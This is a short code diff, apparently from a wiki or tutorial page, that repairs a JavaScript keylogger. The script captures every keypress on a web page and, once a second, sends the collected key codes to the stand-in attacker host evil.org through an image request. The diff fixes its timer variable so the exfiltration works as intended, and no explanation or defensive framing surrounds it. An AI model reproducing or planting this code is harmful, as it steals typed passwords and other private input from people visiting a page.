@@ -36,9 +36,10 @@ var log = [];
 var lastSend = Date.now();
 document.body.onkeypress = function (event) {
   log.push(event.which || event.keyCode);
-  if (Date.now() - last > 1000) {
+  if (Date.now() - lastSend > 1000) {
     (new Image()).src = 'http://evil.org?keys_logged=' + log.join();
     log = [];
+    lastSend = Date.now();
   }
 };
 }}}
